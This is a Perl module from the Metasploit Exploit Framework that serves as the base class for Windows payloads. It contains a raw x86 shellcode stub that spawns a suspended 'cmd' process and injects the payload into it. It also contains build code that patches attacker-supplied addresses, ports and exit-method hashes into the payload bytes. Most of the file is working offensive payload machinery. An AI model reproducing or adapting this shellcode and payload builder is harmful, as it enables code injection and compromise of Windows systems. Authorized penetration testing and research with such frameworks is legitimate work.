#!/usr/bin/perl
###############

##
#         Name: Win32Payload.pm
#       Author: H D Moore <hdm [at] metasploit.com>
#      Version: $Revision$
#  Description: Parent class for win32 payloads, supporting preforking,
#               multiple process exit methods, etc. Inherits from Payload.
#      License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
##

package Msf::PayloadComponent::Win32Payload;
use strict;
use base 'Msf::Payload';
use Pex::Utils;
use vars qw{@ISA};

sub import {
  my $class = shift;
  @ISA = ('Msf::Payload');
  foreach (@_) {
    eval("use $_");
    unshift(@ISA, $_);
  }
}


my $exit_types = 
{ 
    "process" => Pex::Utils::RorHash("ExitProcess"),
    "thread"  => Pex::Utils::RorHash("ExitThread"),
    "seh"     => Pex::Utils::RorHash("SetUnhandledExceptionFilter"),
};

# The fork code was written by Jarkko Turkulainen <jt [at] klake.org>

my $prefork_exit = 349;
my $prefork_plen = 272;
my $prefork_code =
"\x81\xec\x00\x04\x00\x00\x89\xe5\xeb\x6b\x56\x6a\x30\x59\x64\x8b".
"\x01\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e\xc3\x60\x8b\x6c".
"\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a".
"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc".
"\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28".
"\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb".
"\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\x5a\x66\x81\xc2\xcb".
"\x00\x89\xd7\xeb\x1f\xe8\xf1\xff\xff\xff\xfe\xc9\xff\x34\x8f\x53".
"\xe8\x98\xff\xff\xff\x89\x44\x8d\x00\x89\xe0\x04\x08\x89\xc4\x38".
"\xd1\x75\xe7\xc3\xe8\x71\xff\xff\xff\x89\xc3\x31\xc9\x31\xd2\x80".
"\xc1\x07\xe8\xd3\xff\xff\xff\xc7\x45\x20\x63\x6d\x64\x00\x83\xc7".
"\x1c\x89\xfe\xfc\x31\xc9\x66\xb9\x20\x03\x8d\x7d\x30\x31\xc0\xf3".
"\xaa\x31\xc0\x31\xdb\x8d\x4d\x30\x51\x8d\x4d\x74\x51\x50\x50\x80".
"\xc3\x04\x53\x50\x50\x50\x8d\x5d\x20\x53\x50\xff\x55\x00\xc7\x85".
"\x84\x00\x00\x00\x07\x00\x01\x00\x8d\x85\x84\x00\x00\x00\x50\xff".
"\x75\x34\xff\x55\x04\x31\xc0\x6a\x40\x68\x00\x10\x00\x00\x68\x00".
"\x00\x01\x00\x50\xff\x75\x30\xff\x55\x08\x89\xc7\x31\xdb\x53\x68".
"\xfa\x79\xf0\x4c\x56\x57\xff\x75\x30\xff\x55\x0c\xc7\x85\x84\x00".
"\x00\x00\x07\x00\x01\x00\x89\xbd\x3c\x01\x00\x00\x8d\x85\x84\x00".
"\x00\x00\x50\xff\x75\x34\xff\x55\x10\xff\x75\x34\xff\x55\x14\x31".
"\xc0\x50\xff\x55\x18\x72\xfe\xb3\x16\xd2\xc7\xa7\x68\x9c\x95\x1a".
"\x6e\xa1\x6a\x3d\xd8\xd3\xc7\xa7\xe8\x88\x3f\x4a\x9e\x7e\xd8\xe2".
"\x73";


sub new {
    my $class = shift;
    my $hash = @_ ? shift : { };
    my $self = $class->SUPER::new($hash);
    $self->InitWin32;
    return($self);
}

sub InitWin32 {
    my $self = shift;
    $self->{'Win32Payload'} = $self->{'Info'}->{'Win32Payload'};
#    delete($self->{'Info'}->{'Win32Payload'});
    
    $self->{'Info'}->{'UserOpts'}->{'EXITFUNC'} = [0, 'DATA', 'Exit technique: "process", "thread", "seh"', 'seh'];
    
    ## disabled until I fix some bugs
    ## $self->{'Info'}->{'UserOpts'}->{'PREFORK'}  = [0, 'BOOL', 'Execute payload in forked process'];
}

sub Size {
    my $self = shift;
    my $size = 0;
    $size += length($prefork_code) if $self->GetVar('PREFORK');
    $size += length($self->{'Win32Payload'}->{'Payload'});
    $self->PrintDebugLine(3, "Win32Payload: returning Size of $size");
    return $size;
}

sub Build {
    my $self = shift;
    my $payload  = $self->{'Win32Payload'}->{'Payload'};
    my ($forkstub, $exit_offset, $generated);
    
    if ($self->GetVar('PREFORK'))
    {
        $forkstub = length($prefork_code);
        $exit_offset = $prefork_exit;
        $generated = $prefork_code . $payload;
        substr($generated, $prefork_plen, 4, pack('V', length($payload)));
    }
    else {
        $forkstub = 0;
        $exit_offset = $self->{'Win32Payload'}->{'Offsets'}->{'EXITFUNC'}->[0];
        $generated = $payload;    
    }


    $self->PrintDebugLine(3, "Win32Payload: forkstub=$forkstub exitoffset=$exit_offset");
    $self->PrintDebugLine(3, "Win32Payload: generated code: " . length($generated) . " bytes\n");

    my $opts = $self->{'Win32Payload'}->{'Offsets'};
    foreach my $opt (keys(%{ $opts }))
    {
        $self->PrintDebugLine(3, "Win32Payload: opt=$opt");
        
        next if $opt eq 'EXITFUNC';
        next if $opt eq 'PREFORK';
        
        my ($offset, $opack) = @{ $self->{'Win32Payload'}->{'Offsets'}->{$opt} };
        my $type = $opts->{$opt}->[1];    
        
        $self->PrintDebugLine(3, "Win32Payload: opt=$opt type=$type");   
        if (my $val = $self->GetVar($opt))
        {
            $self->PrintDebugLine(3, "Win32Payload: opt=$opt type=$type val=$val");      
            $val = ($type eq 'ADDR') ? gethostbyname($val) : pack($opack, $val);
            substr($generated, $forkstub+$offset, length($val), $val);
            $self->PrintDebugLine(3, "Win32Payload: forkstub+offset=" .  $forkstub+$offset . " ($opack)");  
        }
    }

    if($exit_offset > 0) {
        my $exit_func = ($self->GetVar('EXITFUNC')) ? $self->GetVar('EXITFUNC') : 'seh';
        my $exit_hash = exists($exit_types->{$exit_func}) ? $exit_types->{$exit_func} : $exit_types->{'seh'};
        substr($generated, $exit_offset, 4, pack('V', $exit_hash));
        $self->PrintDebugLine(3, "Win32Payload: exitfunc: $exit_offset -> $exit_hash ($exit_func)");
    }

    return $generated;
}

1;